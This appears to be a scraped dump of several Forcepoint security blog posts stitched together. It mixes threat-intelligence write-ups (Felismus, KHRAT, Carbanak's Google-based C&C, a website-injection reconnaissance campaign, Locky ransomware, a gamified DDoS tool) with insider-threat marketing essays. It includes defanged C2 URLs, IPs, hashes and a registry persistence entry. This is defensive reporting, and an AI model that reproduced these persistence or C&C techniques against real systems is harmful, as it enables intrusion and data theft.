research.\n\nIf the other modules and capabilities associated with the malware remain a matter of speculation, so too do the intended target(s). Of the five domains hosted on the C2 IP address identified within this post, three - cosecman[]com, nasomember[]com, and unmailhome[]com - have potential associations with the financial services sector; however, under this theory the naming of the remaining two domains - maibars[]com and mastalib[]com - remain unexplained.\n\nWhat does feel clear from this analysis is that the malware and its dependent libraries are under active maintenance and that these samples are likely only a part of a larger campaign, the perpetrators and intentions of which remain obscure.\n\nIndicators of Compromise\n\nSHA256\n\n\ne48822e0c5ceae5377100053047e78f015b1ec2372f349eaa9e98f25ba33e4da\nfd760ad4b3251de7ec976f60cdbf45e21f33c4744cc1176c5bba9f2a9e1a622e\ne20aaae703a3f6683d963c1035c10d5db7e460a4a331e2e6ea44308e4f8acf9f\n6d36d346865829e04b54b433d0ee9c07aa3df9ee07285924aef7abc92972ba3d\n6fc68860601f4d2d2c919a7e711bc37b1c4b3ccdaead7835879a9e4d40cddce7\n\nDomains & URLs\n\n\nhxxp://www[]cosecman[]com/notice/news/items.php\nhxxp://www[]cosecman[]com/notice/items/products.php\n\nIP Addresses\n\n\n103.43.18.105:80\n\nFiles\n\n\nAdobeCMS.exe\n%APPDATA%/Roaming/Microsoft/Security/httpdll.dll\n%APPDATA%/Roaming/Microsoft/Security/converts.dll\n%APPDATA%/Roaming/Microsoft/Security/logs.txt\n%APPDATA%/Roaming/Microsoft/Security/data\n\nFootnotes\n\n[1] http://www.adobe.com/uk/marketing-cloud/enterprise-content-management/web-cms.html\n\n[2] http://www.rising-global.com/\n\n[3] https://www.viruschaser.com/ \n\n[4] https://wordpress.org/news/2013/01/wordpress-3-5-1/\n\n[5] http://tdm-gcc.tdragon.net/\n\n[6] https://play.google.com/store/apps/details?id=com.polaris.octopus&hl=en\n\n[7] http://www.securityfocus.com/bid/96783', 'https://www.forcepoint.com/blog/security-labs/playing-cat-mouse-introducing-felismus-malware\n');

This PE file is KHRAT, which will be discussed in the next section.\n\nKHRAT\n\nKHRAT is a small backdoor that has three exports (functions), namely, K1, K2, and K3. K1 checks if the current user is an administrator. If not, it uninstalls itself by calling the K2 function.\n\nOtherwise, it creates the following registry as a persistence mechanism and then calls the function K3:\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\nRun = \"\"%USERPROFILE%\\SysWOW64.com\" %USERPROFILE%\\USER.DAT,K1\"\n\n\nK3 then elevates the malware’s privilege, by giving itself SE_DEBUG_PRIVILEGE privileges via a RtlAdjustPrivileges call, and proceeds to communicate to its command and control (C2) server. The malware initially registers itself to the C2 server by sending the infected machine’s username, system language, and local IP address.\n\nAll communication to and from the C2 server are encrypted in byte-wise XOR.

This leads us to believe that KHRAT is simply a rehash of codes that are available on Chinese code sharing sites.

Existing processes, procedures, and organizational structures limit the abilities of many federal agencies to collaborate and meet these emerging cyber and insider threats. Stove pipes remain within the federal government and processes have been very regimented, lacking the creativity and flexibility to adapt to a new world.\n\n\n	And of course, agencies used to assume that when a worker signs an NDA, the individual would abide by all the rules and processes despite the inconvenience to their personal lives. Employees would never think about violating the NDA or discussing internal politics outside the organization; discussing how their people interacted with data and systems would be a taboo subject.\n\n\n	But millennials have different expectations than their predecessors and are less willing to accept limitations for accessing their smartphones, the Internet and their social media such as Facebook, Instagram, Snapchat and others, in federal agencies. At the same time, the federal government is experiencing a talent deficit and needs to attract top notch expertise to secure the most sensitive networks and protect against inadvertent or malicious data theft.\n\n\n	Therein lies the challenge.  Many practitioners attempt to secure or block the use of new or popular technologies in the workplace with more technology. But technological solutions on their own can’t solve a problem with human behavior at its core. By thinking about how humans interact with technology and data – what we refer to as the ‘human point’ in security - we stop the endless pursuit of attacker-controlled inputs and instead focus on understanding the motives, intents, feelings, and actions of those closest to our data: users. Only by first understanding the problem from this perspective can the technologies that might address it be implemented appropriately.\n\n\n	Despite numerous presidential executive orders, memorandums and directives, there remains a hole in many agencies’ overall cyber plan to include processes, procedures and technologies to address the rising problem associated with insider threat breaches. Many agencies tell themselves that they have this covered with their traditional cyber security tools. But relying on old school processes and technology is not an effective strategy to provide enterprise visibility on how employees are interacting with sensitive data and networks.\n\n\n	The focus must be on the cultural changes regarding millennials’ security awareness. Agencies must be willing to change the status quo and adopt technologies that truly get to the heart of many security problems – user behavior.\n\n\n	The right solution should be human-centric, not technology-centric. Combining technologies such as endpoint monitoring with user behavior analytics provides a unique and powerful capability for federal agency cybersecurity teams to proactively reduce the risk of insider threat data breaches by protecting the human point of contact, where data is most valuable – and vulnerable.\n\n\n	In my next blog, I’ll talk about how federal agencies can close the technical and knowledge gap to get enterprise visibility of the workforce.\n\n\n	Hear more from Michael about the Millennial impact on insider threats at Forcepoint\'s Cybersecurity Leadership Forum Tuesday April 11th in Reston, VA.', 'https://www.forcepoint.com/blog/insights/millennials-machine\n');

This is where insider threat solutions come in; gaining awareness and context on user behavior and selectively adjusting DLP policies so these employees are able to do their jobs effectively.”\n\n\n	\n\n\n	Above: Moderator with Vikram Phatak, Hitesh Sheth and Dr. Richard Ford at Invincea and CSM Passcode’s third annual #BeatTheBreach Town Hall \n\n\n	In the evening, Forcepoint Commercial CTO Dr. Richard Ford also discussed the importance of taking users into account as part of Invincea and CSM Passcode’s third annual #BeatTheBreach Town Hall as part of panel with Hitesh Sheth President and CEO of Vectra and Vikram Phatak, Chief Executive Officer and Chairman of the Board for NSS Labs, Inc. The panel discussed how security professionals are drowning in data and the need to separate the signal from the noise, the “accidental insider threat” from “real insider threat,” among other things. All participants agreed that the one thing security executives should consider now that they haven’t traditionally paid attention to in the past are the users; how users are interacting with data and why. Panelists emphasized that relying only on technology to protect your organization, without understanding the intent and motivations of your users on the network, only solves part of the problem.

Below is a list of the affected sites we have observed:\n\nForeign affairs ministries of Kyrgyzstan, Moldova and Uzbekistan\n	Embassy sites of Iraq, Jordan, Zambia and Russia\n	A political party in Austria\n	A government-run, sustainability site in Austria\n	A sports association in Austria\n	A Somalian news site\n	A socialist organization in Spain\n	An international cooperation organization based in France\n	An African union site\n	A road safety site from Ukraine\n	An African plant society\nInterestingly, all of the targeted embassy sites were embassies located in Washington, D.C., United States. Forcepoint has notified the administrators of the sites that were confirmed to be compromised. \n\nInjection\n\nTarget websites were compromised with a code that looks like a web analytics script from the web analytics service, Clicky. A snippet of the injected code is as follows:\n\n\n\nA closer look at the code shows that while the Clicky site static.getclicky.com/js was declared in the variable s.src, the same variable is simply overwritten with the actual malicious site hxxp://www.mentalhealthcheck[.]net/update/check.php. The final HTTP request is sent to this site which then responds with Joseph Myers’ Javascript implementation of the MD5 algorithm:\n\n\n\nAs reported by the Swiss GovCERT, the Turla group is known to use Google Analytics scripts to disguise their malicious code on compromised websites. They then evaluate compromised sites\' visitors, through fingerprinting and an IP target list, before a malicious payload is served. These techniques are strikingly similar to this campaign wherein the injected codes are disguised as a Clicky web analytics script. In addition, the above HTTP response suggests that it is simply used to cover the malicious activity to visitors outside the attackers\' interest.\n\nThe actors behind the campaign actively manages the injected scripts. For instance, we have seen them comment out their injected script in a particular site for a certain period and then reactivate it again. Injected scripts are also updated with new malicious sites.\n\nTimeline\n\nThe campaign dates as far back as December 2015 when the first malicious domain used for the landing page, nbcpost[.]com, was registered. In November 2016, compromised sites were then updated with new landing sites using the domains epsoncorp[.]com and mentalhealthcheck[.]net - both were registered in February 2016. Just this week, they updated their landing page yet again under a new domain, travelclothes[.]org, which was registered on November 2016.\n\nMeanwhile, the earliest compromise we have seen is April 2016 and the majority of the affected sites we have observed appears to have been compromised at that time. Some sites were compromised for a brief period, while some remained compromised for as long as 10 months.\n\nProtection statement\n\nForcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 2 (Lure) - The injected code on the compromised site is detected and the site is blocked.\n\nConclusion\n\nThis post describes a reconnaissance campaign that actively obtains foothold on government and private websites. The tactics and the targeting of this campaign overlaps with those of the Turla group. However, no conclusive evidence is available to confirm a relationship between the two and the motive behind this campaign is yet to be uncovered. It is recommended that website administrators review their websites for similar injections to prevent their visitors from being subject to a potential attack.\n\nWe would like to clarify that the Clicky web analytic platform is not being used for malicious purposes and is only used as a disguise for this campaign. We would also like to thank Clicky for sharing their insights during our investigation.\n\nWith additional insights from Nicholas Griffin and Sindyan Bakkal.\n\nIndicators of Compromise\n\nLanding Pages\n\n\nhxxp://rss.nbcpost[.]com/news/today/content.php\nhxxp://drivers.epsoncorp[.]com/plugin/analytics/counter.js\nhxxp://www.mentalhealthcheck[.]net/update/check.php\nhxxp://www.mentalhealthcheck[.]net/update/counter.js\nhxxp://static.travelclothes[.]org/main.js', 'https://www.forcepoint.com/blog/security-labs/curious-case-reconnaissance-campaign-targeting-ministry-and-embassy-sites\n');

The actors typically steal from financial institutions using targeted malware. Recently a new Carbanak attack campaign dubbed \"Digital Plagiarist\" was exposed where the group used weaponized office documents hosted on mirrored domains, in order to distribute malware.\n\nWeaponized document\n\nThe RTF document we analyzed (SHA1 1ec48e5c0b88f4f850facc718bbdec9200e4bd2d) has an embedded OLE object which contains a VBScript file. When the document is opened the targeted user is lured into double-clicking on the embedded OLE object which is disguised as an image:\n\n\n\nDouble clicking on the image results in a file open dialog for \"unprotected.vbe\". If the user executes this file then the VBScript malware will begin to execute.\n\nEncoded VBScript malware\n\nThe VBScript malware inside the RTF document (SHA1 cd75662751c59951717b4704ea2cdb6fb7ec19bc) is an encoded VBScript file. We decoded the script and found hallmarks typical of the Carbanak group\'s VBScript malware, however we also found the addition of a new \"ggldr\" script module.\n\n\n\nThe module is base64 encoded inside the main VBScript file along with various other VBScript modules used by the malware. When we analyzed the script we noticed that it is capable of using Google services as a C&C channel.\n\nAbusing Google for C&C communication\n\nThe \"ggldr\" script will send and receive commands to and from Google Apps Script, Google Sheets, and Google Forms services. For each infected user a unique Google Sheets spreadsheet is dynamically created in order to manage each victim. The use of a legitimate third party service like this one gives the attacker the ability to hide in plain sight. It is unlikely that these hosted Google services are blocked by default in an organization, so it is more likely that the attacker will establish a C&C channel successfully.\n\nThe C&C procedure is outlined in the diagram below.\n\n\n\nUpon the first attempt to contact the hard-coded Google Apps Script URL with the user\'s unique infection ID, the C&C will state that no spreadsheet currently exists for the user. The malware will then send two requests to another hard-coded Google Forms URL which will result in the creation of unique Google Sheets spreadsheet and Google Form IDs for the victim.\n\nThe second time the Google Apps Script is requested, the C&C will return the unique Google Sheet and Google Form ID values:\n\n\nThe \"entry\" value is also a unique ID which is sent with each subsequent Google Forms C&C request.\n\nProtection statement\n\nForcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 5 (Dropper File) - The malware components are prevented from being downloaded and/or executed.\n\nStage 6 (Call Home) - The HTTP-based Carbanak C&C traffic is blocked.\n\nSummary\n\nThe Carbanak actors continue to look for stealth techniques to evade detection. Using Google as an independent C&C channel is likely to be more successful than using newly created domains or domains with no reputation. Forcepoint will continue to monitor this group\'s activities and share data with trusted partners.\n\nIndicators of Compromise\n\nCarbanak Documents\n\n\n			\n1ec48e5c0b88f4f850facc718bbdec9200e4bd2d (3-ThompsonDan.rtf)\n400f02249ba29a19ad261373e6ff3488646e95fb (order.docx)\n88f9bf3d6e767f1d324632b998051f4730f011c3 (claim.rtf)\n			\n		Carbanak Google Apps Script C&Cs\n\n\n			\nhxxps://script.google[.]com/macros/s/AKfycbzuykcvX7j3TlBNyQfxtB1mqii31b4VTON640yiRJT0t6rS4s4/exec\nhxxps://script.google[.]com/macros/s/AKfycbxxx5DHr0F8AYhLuDjnp7kGNELq6g27J4c_JWWx1p1nDfZh6InO/exec\nhxxps://script.google[.]com/macros/s/AKfycbwZHCgg5EsCiPup_mNxDbSX7k7yBMeXWenOVN1BWXHmyBpb8ng/exec\n			\n		Carbanak Google Forms C&Cs\n\n\n			\nhxxps://docs.google[.]com/forms/d/e/1FAIpQLScx9gwNadC7Vjo11mXLbU3aBQRrqVpoWjmNJ1ZneqpjaYLE3g/formResponse\nhxxps://docs.google[.]com/forms/d/e/1FAIpQLSfE9kshYBFSDAfRclW8m9rAdajqoYhzhEYmEAgZexE3LQ-17A/formResponse\nhxxps://docs.google[.]com/forms/d/e/1FAIpQLSdcdE7lTEiqV5MW3Up8Hgcy5NGkIKnLKoe0YPFriD4_9qYq9A/formResponse\n			\n		Carbanak C&Cs\n\n\n			\nhxxp://atlantis-bahamas[.]com/css/informs.jsp\nhxxp://138[.]201[.]44[.]4/informs.jsp\n			\n		Carbanak Cobalt Strike / Meterpreter DNS Beacon C&Cs\n\n\n			\naaa.stage.15594901.en.onokder[.]com\naaa.stage.4710846.ns3.kiposerd[.]com', 'https://www.forcepoint.com/blog/security-labs/carbanak-group-uses-google-malware-command-and-control\n');

Of course, we all realize that some of these “promises” are easier to keep than others. But if experience has taught us anything, it’s that we meet with more success here when our goals are tangibly beneficial and realistically achievable: We know what positive outcomes we’ll derive. And getting there won’t overwhelm us to the point where we quit.\n\n\n	We should take the same approach in “resolving” to confront the ever-growing presence of insider threats, as nearly three-quarters of organizations are vulnerable to these threats, according to survey research from Palerra. But only 42 percent have the right controls in place to prevent them.\n\n\n	I’ve found that organizations typically fail to establish these controls because they’re daunted by the enormity of the issue, i.e., a “Where do we start?’’ syndrome. So I advise them to tackle it like you would a successful New Year’s resolution commitment by adopting the following three attainable and impactful steps:\n\n\n		Build your program’s foundation upon risk management. I’m asked to attend many client meetings about insider threats, and the conference rooms are inevitably filled with IT engineers. They want to proceed with a completely tech-centric strategy, leaving out the business and “people” part of the equation. What’s needed, I tell them, is the involvement of risk management leaders, so we can align everything we’re doing to the business at hand. Through optimal risk management analysis, we determine what is unique about our organization, and how insider threats can keep us from the pursuit of strategic goals. As part of this, you conduct an inventory to identify your data-based “crown jewels” – what are they, and where do they exist? – and develop a risk management plan to protect each one. The plan should cover not only technical solutions, but the human element. (But more about the latter in our third and final “resolution.”).\n	\n		Put someone in charge. Every ship needs a captain, right? Your initiative will go nowhere if you fail to appoint a person with proper credentialing as its manager. Again, the manager does not move forward with strictly “tech” remedies. He or she may not have a deep background in cybersecurity solutions. But the manager must be capable of combining the risk management approach with a technical one to assemble a valuable and lasting insider threat response – one that remains consistent as it’s applied to a cross-section of departments enterprise-wide.\n	\n		Train, train, train … As promised, this is where the “people” part comes into play. You have incorporated a risk management approach. You have designated a person in charge. Now, you have to bring your program and message to those who represent the “make or break” factor in terms of future success – your employees. Because our final resolution proves so essential, let’s break it down into four critical training components:\n		\n				Defining the insider threat. Insider threats come in many forms. They are malicious employees who intentionally steal data, sabotage systems, etc. because they were passed up for promotions and raises – or simply hate their bosses and/or jobs. In addition, there are “accidental” insiders who bear no ill-will toward their organizations, but still invite compromises due to their risky behaviors. Then there are third-parties – the contractors and partners whose level of risk becomes our level of risk due to our business associations and interdependencies upon systems, apps, communications tools, etc. You should make your employees aware of all forms of insider threats.\n			\n				Illustrating what insider threat activity looks like. Here is where you educate staffers about what to look for and what to do. In addressing accidental insider scenarios, you must raise awareness about the dangers of shared passwords, and the need to change passwords routinely while avoiding the use of simple, predictable ones. Employees should learn about the latest in phishing scam techniques as well – where did that link come from, and how do I know if I can trust the source? As for malicious insiders, staffers should know how to recognize them … Is a colleague always grumbling about work, the company, etc. and constantly transferring files to a thumb drive? Are the files unrelated to his work? Does he log-in from odd locations, at odd hours? You must explore these and other classic trouble signs.\n			\n				Explaining why this matters. Don’t overlook the “who cares?” question, because your employees will ask it – either overtly or quietly among themselves. Enlighten them about the potential for insider threats to trigger productivity disruptions, systems crashes, corporate losses, reputational damage and strategic failure. Such fallout can lead to devastating consequences which affect everyone, as the cost of insider threat incidents now averages $4.3 million, according to research from the Ponemon Institute.\n			\n				Announcing what the organization is doing. Using live presentations, printed materials and online resources, walk your people through your intended immediate and long-term actions steps. This includes technical and auditing controls. But you should also provide helpful information about, say, a central website through which staffers can find out about the latest insider threat trends and even share best practices.\n		\n\n	With a risk management “big picture” plan, a person in charge and ongoing training/awareness, you cultivate a culture of insider threat deterrence. The culture is there on the office bulletin board and company signage. It’s in the office kitchenette where employees gather to share what they’re observing. It’s in their email inboxes, as your insider threat manager sends the latest in related news and recommendations\n\n\n	As a deterrence culture takes hold, you reduce the potential for pushback on the technologies you’ll soon introduce to monitor for insider threat activity and prevent/mitigate it. Without such a culture, employees may find the technologies intimidating. But once they understand what’s at stake, they’ll not only accept the changes and the program in general – they’ll emerge as advocates for them, as “resolutions” that are worth keeping.', 'https://www.forcepoint.com/blog/insights/three-%E2%80%9Cmust-do%E2%80%9D-new-year%E2%80%99s-resolutions-eliminate-insider-threats\n');

While self-analysis can sometimes be a grey area, how employees treat data is much more black and white. If there’s anything 2016 has taught us, it’s that treatment of important data is just as important as the security tools organizations have in place. This is backed up by data of course, most recently with a Forrester Research study that saw a staggering 36% of all security breaches coming from careless users—with numerous employees treating data as haphazardly as a young child opening up presents on Christmas Day. With that being said, what can employees do to better handle data?\n\n\n	When in the workplace, always follow the golden rule—treat proprietary data as you would want your own personal data to be treated. As you look back on an eventful 2016, ask yourself:\n\n\n	Do I deserve a gift or a lump of coal from cybersecurity Santa?\n\n\n	Here are some questions that might help gauge how naughty or nice you were to your organization’s data this year:\n\n\n		Do you lock your screen when you leave your device?\n	\n		Do you use an unlocked or altered BYOD that connects to the network?\n	\n		Do you leave sensitive data on a USB or other storage drive?\n	\n		Do you post sensitive details about your job or responsibilities on social media?\n	\n		Do you use the same password for work as you do in your personal life?\n	\n		Do you put off updating your work pc?\n	\n		Have you ever given sensitive information from someone claiming to be from IT helpdesk?\n	\n		Are you careful with emails that look fraudulent?\n	\n		Have you ever misplaced your work device and not reported it?\n	\n		Do you use a VPN to login to the company network?\n\n	How did you do? If you answered these questions confidently, give yourself a pat on the back. You’re giving your organization the gift that keeps on giving—end user data protection. If you were caught off guard by any of these questions, take some time to educate yourself on how to best protect your data in this new age of insider threats. It only takes a small user error to expose an entire network and destroy years of work in mere seconds. Let’s make sure the lump of coal goes to naughty hackers, not to hardworking employees.', 'https://www.forcepoint.com/blog/insights/have-you-been-naughty-or-nice-your-organization%E2%80%99s-data-year\n');

In this blog we give a brief overview of what Locky is and cover the significant aspects of its infamous history.\n\n\n	What is Locky?\n\n\n	Locky is a crypto-ransomware which aims to infect machines, encrypt sensitive information, and hold the data to ransom by requesting a payment to get the files decrypted.\n\n\n	\n\n\n	Locky actors aim to make significant financial gain from successfully extorted users. There appear to be several different actors who utilise and distribute unique builds of Locky, and these are known as \"affiliates\".\n\n\n	Distribution Methods\n\n\n	Locky has been an almost daily threat plaguing users since February 2016. It is distributed through the use of both exploit kits and e-mail. The Neutrino, RIG and (now defunct) Nuclear exploit kits have all distributed Locky sporadically throughout 2016. The Necurs botnet is the main perpetrator behind the spam e-mails resulting in Locky infections, usually as a result of a malicious Microsoft Office file or a ZIP attachment containing a malicious script.\n\n\n	\n\n\n	Locky affiliates have used a number of different file types maliciously in order to initiate a Locky infection including:\n\n\n		Microsoft Office (\".doc\", \".docx\", \".xls\" etc.) utilising Visual Basic for Applications (VBA)\n	\n		JScript (\".js\")\n	\n		JScript Encoded (\".jse\")\n	\n		VBScript (\".vbs\")\n	\n		Windows Script File (\".wsf\")\n	\n		Compiled HTML (\".chm\")\n	\n		HTML Application (\".hta\")\n	\n		Link Shortcut (\".lnk\")\n	\n		Windows Executable (\".exe\")\n	\n		Windows Dynamic Link Library (\".dll\")\n	\n		Windows Powershell\n\n	Secure Encryption Algorithm\n\n\n	Locky encrypts users\' files rapidly by using 128-bit AES encryption, and subsequently protecting the key using 2048-bit RSA encryption.\n\n\n	\n\n\n	Encrypted files are typically renamed to end with \".locky\" although newer variants of Locky result in filenames such as \".zepto\", \".odin\", \".thor\", \".zzzzz\" and \".aesir\". Locky was updated in July 2016 to support offline encryption mode, meaning that network traffic was no longer required in order to perform secure file encryption.\n\n\n	Command-and-Control (C&C)\n\n\n	Locky is able to generate and keep track of unique RSA keys for each infected machine. It does this by contacting its C&C to report in and obtain the key.\n\n\n	\n\n\n	On July 12, 2016 an offline encryption feature was added whereby an RSA key is embedded inside the malware in case it is unable to communicate with its C&C and obtain a key.\n\n\n	Ransom Payment\n\n\n	Users\' files are held to ransom until payment is made for a unique decryption utility. Locky requires users to pay using the anonymous Bitcoin (BTC) currency, which helps to hide the Locky affiliates\' identities from law enforcement. Typically the amount requested is between 0.5 to 1 BTC, which is roughly the equivalent of around 400 to 800 USD.\n\n\n	Over the course of 2016 Locky has grown to support a wide range of languages for its payment pages. As of December 2016 Locky is able to display this page in 30 different languages.\n\n\n	\n\n\n	Timeline of Locky\n\n\n	February - Locky is Born\n\n\n		On February 15 the first samples of Locky were seen. After its birth Forcepoint were the first to expose the inner workings of the Locky domain generation algorithm (DGA) used for C&C communication:/security-labs/locky-ransomware-encrypts-documents-databases-code-bitcoin-wallets-and-more\n		The release of this blog caused the actor(s) to put a stop to their activities for a few days, spurring them to improve their DGA. A few days later on February 24 Locky returned with a new and improved DGA, and once again we exposed it:/security-labs/lockys-new-dga-seeding-new-domains\n		This new update also included the ability for Locky to identify Russian language machines, refusing to encrypt them.\n\n	May - Distribution Issues\n\n\n		On May 31 the Necurs botnet went down and as a result Locky all but disappeared.\n\n	June -  Back to Business & Zepto Variant\n\n\n		On June 21 Locky returned in full force with brand new anti-analysis tricks. The payloads were now encrypted with unique keys which were decrypted and run by the JS downloaders. The payloads themselves also began to require a command line argument in order to execute properly. Both of these tricks were designed to trip up automated security tools.\n		We documented one of the more interesting anti-analysis tricks employed within Locky itself:/security-labs/locky-returned-new-anti-vm-trick\n	\n		On June 27 the first Zepto variants of Locky were seen, using the \".zepto\" filename extension instead of \".locky\". These appear to have been used exclusively by Locky affiliate 3.\n\n	July - Offline Encryption\n\n\n		On July 12 Locky added support for offline encryption using embedded RSA keys in case the malware is unable to communicate with its C&Cs.\n\n	September - Experimenting with new Ideas\n\n\n		On September 5 some Locky samples stopped using C&Cs altogether, instead relying solely on the offline encryption mode.\n		 \n	\n		On September 12 Locky affiliate 3 used a brand new intermediary trojan downloader which Forcepoint identified as \"Quant Loader\". This had been first advertised on Russian underground forums at the beginning of September:/security-labs/locky-distributor-uses-newly-released-quant-loader-sold-russian-underground\n	\n		On September 26 the first Odin variants of Locky were seen, using the \".odin\" filename extension instead of \".locky\" or \".zepto\". Once again these appear to have been used exclusively by Locky affiliate 3.\n\n	October - Taking a Break\n\n\n		On October 7 the most prevalent Locky actors (affiliates 1 and 3) went quiet. We can only speculate as to why this may have been - spending their money, taking a vacation, or issues with their distribution. Other Locky affiliates such as 5 and 23 remained active in low volumes.\n		 \n	\n		On October 24 Locky affiliates 1 and 3 made a full return, with affiliate 3 once again changing filename extension to \".shit\". Since this date both affiliates have consistently made use of C&Cs again rather than relying solely upon offline encryption.\n		 \n	\n		On October 25 some Locky affiliates started using the filename extension \".thor\".\n\n	November / December - C&C Traffic Changes\n\n\n		On November 21 some Locky affiliates began using C&C URLs ending with \".cgi\" instead of the usual \".php\", such as hxxp://<IP-or-DGA-domain>/information.cgi. These affiliates also switched from the \".thor\" filename extension to \".aesir\".\n		 \n	\n		On November 29 Locky \".aesir\" affiliates started using the filename extension \".zzzzz\".\n		 \n	\n		On December 5 the \".zzzzz\" Locky affiliates stopped using file extensions on their C&C URLs altogether, and switched to using the filename extension \".osiris\".\n\n	 \n\n\n	What Does the Future Hold?\n\n\n	We do not expect Locky to disappear any time soon. and we will continue to monitor and track changes to Locky variants.

This is the season, after all, when your executives, middle-level managers, staffers, contractors and other authorized users are often working remotely and multitasking to get everything done before the winter break. Many, of course, are also surreptitiously shopping online on company-owned computers: Two-thirds of employees said they holiday shop online while on lunch breaks, according to a recent survey from Robert Half Technology. Two of five do so on work-issued computers and, worse yet, 55 percent said their employer has never provided to them any information/training about the security risks of such activity.\n\n\n	In other words, it’s hardly a “holly, jolly” time of the year for beleaguered cybersecurity teams, thanks to the ever-present “accidental insider threat” – employees and additional users who harbor no malicious intent, yet invite network/data compromises through their own ill-conceived and frequently careless behaviors. In fact, accidental insiders account for more than one-half of internally caused breaches, according to Forrester.\n\n\n	So who are these people and what sort of activity do you need to monitor? In keeping with the seasonal theme here, we’ll present the following “12 Accidental Insiders” of the holidays, as broken down into four classic categories:\n\n\n	1. Convenience Seekers\n\n\n	Description: They’re typically not “bad” employees. They’re just constantly in a rush, saddled with lots of responsibilities and tasks. Yet, in trying to be productive and accountable, they let their guard down. They include people like …\n\n\n	Sarah in R&D. She’s looking forward to a “Caribbean for Christmas” destination vacation. But she also wants to do work on the plane. So she copies a dozen docs onto her USB drive. Oh, and she bought the drive used from an unfamiliar online vendor to save a few bucks. And, yep, it’s infected.\n\n\n	Bob the senior salesman. Because he’s always on the road – especially as he looks to discount-sell a ton of inventory before the end of the calendar year – Bob can’t get enough of cloud-based storage services to share daily lead sheets with his team. Even services which aren’t authorized by IT.\n\n\n	Tom in auditing. Tom travels all the time, going to regional and international office locations to examine the books. He lives on public Wi-Fi at airports, hotel lounges, etc. And he never bothers to assess the trustworthiness of the source of his connectivity – he’s just happy to log-on!\n\n\n	2. Know-It-Alls\n\n\n	Description: They’re somewhat tech-savvy – to the point where they believe cyber mistakes are something “other people do.” Here are three of them …\n\n\n	Evan the HR director. He “reads up” on the latest threats, and thinks he can “see” them incoming before they strike. He considers himself a self-taught expert on the topic. Which is why he ignores recommended, baseline precautions from IT, such as activating device encryption or routinely changing his passwords.\n\n\n	Suzy the chief marketing officer. When ad campaigns kick up in December, there isn’t a “latest, greatest” gadget or app that Suzy doesn’t crave – regardless of the vulnerabilities they could bring to the network.\n\n\n	Corinne in customer relations. Corinne firmly believes that the best way to understand customers is to be one. So from Cyber Monday to Christmas Eve, she’s using her work-provided tablet to “shop ‘til she drops,” grabbing every online holiday coupon she can find – even its from an untrusted or unsecure source. If IT sends a company-wide email warning about these sites, she smirks and presses “delete” without calling up the message.\n\n\n	3. Entitled Ones\n\n\n	Description: These folks load up on “privileged user” accommodations. It makes them feel important. Cyber crooks agree that they are, and seek out Entitled Ones as highly valuable targets.\n\n\n	Ingrid in IT administration. There’s no “getting away” for Ingrid, particularly when she’s receiving help desk requests while traveling to see family members during the holidays. She’s so responsive to the requests that she doesn’t always check out the source – a perfect setup for hackers who social-engineer via bogus “emergency” SOSs.\n\n\n	Steve the social media guru. Steve essentially serves as the official “face” of the franchise, posting the latest company news on all of the social media sites – even the ones which are prime attack zones.\n\n\n	Christine the closer. When the deal needs to get done, Christine delivers like no one else. She’ll go anywhere, anytime to “bring that M&A home,” while keeping her laptop in open view for anyone to lurk (or swipe) when she’s in an airport terminal or coffee shop. This is quite risky at this time of year, given the annual spike in travel.\n\n\n	4. Untouchables\n\n\n	Description: These execs and board members are at the top of the corporate food chain. Because they “call the shots,” they’re not about to let IT tell them what to do. They may remind you of bigwigs like …\n\n\n	Caroline the COO. Caroline hops on the company plane and grabs the nearest smartphone to make decisions “on the fly.” She takes pride in making tough “gut calls,” so caution be damned. That goes for her devices too, which are rarely secured.\n\n\n	Henry the board chairman. For Henry, “work stuff” and “personal stuff” all blur into one, so he uses the same, suspect service for business and private emails. Crooks looking to steal proprietary corporate data appreciate this, because Henry makes their job so much easier.\n\n\n	Dan the CEO. The top sets the tone, doesn’t it? Unfortunately, Dan pushes the troops to “deliver big – whatever it takes” to meet end-of-year goals. Consequently, he dismisses the CISO’s timely warnings about heightened risks this month as baseless “Chicken Little panic attacks” which simply “get in the way of business.”\n\n\n	So deck the halls, make preparations for the office party and otherwise enjoy the celebrations. Our Accidental Insider summaries here aren’t intended to put a damper on festive spirits. They’re presented as hypothetical but very realistic “people scenarios” to watch out for, because there’s always a “cyber-Grinch sliding down the chimney” somewhere. By identifying, anticipating and preventing threat-inviting behaviors, you ensure that the holiday season is a memorable – and safe – one.', 'https://www.forcepoint.com/blog/insights/how-%E2%80%9C12-days-christmas%E2%80%9D-create-headaches-cybersecurity-teams\n');

It’s also the name of a recent Distributed Denial of Service (DDoS) attack that targeted organizations with political affiliations that the attacker deems out of  line with Turkey’s current government. These organizations include the German Christian Democratic Party (CDU), The People’s Democratic Party of Turkey, the Armenian Genocide Archive and the Kurdistan Workers Party (PKK).\n\n\n	In our latest report, called Sledgehammer - The Gamification Of DDoS Attacks, we document the tools and attack methods used by a set of Turkish hackers. The name is derived from the name of a DDoS tool that we saw advertised on the underground forums. \n\n\n	\n\n\n	DDoS Attack Games for Hackers\n\n\n	Sledgehammer’s author runs a DDoS collaboration program named Sath-ı Müdafaa or “Surface Defense.\" Using a DDoS tool named Balyoz, hacking participants are asked to attack a limited set of political websites, but can also suggest new websites to add to the list of targets.\n\n\n	For every ten minutes spent attacking one of these websites, users receive points that can be traded in for rewards, such as a stand-alone version of the Sledgehammer DDoS tool and “click-fraud” bots used to generate revenue on pay-to-click (PTC) sites. There is even a live scoreboard so participants can see their point rank.\n\n\n	What is the Motivation of the Hackers?\n\n\n	Forcepoint Security Labs focus on enabling the awareness and understanding of intent. This is useful in order to identify likely future behaviour. The attacker initially attracts subscribers with the promise of participating in a collaborative DDoS system targeting websites of a political nature. “Click-fraud” bots add a monetization aspect to the system. A final twist in the tail was discovered when we uncovered a backdoor in the DDoS toolkit – the author is hacking the hackers. The motivations are varied but the implications are clear.\n\n\n	Who led this Research?\n\n\n	Forcepoint’s Special Investigations team is an elite group of threat researchers and incident response experts specializing in threats exhibiting unique tools, tactics and processes (TTPs).

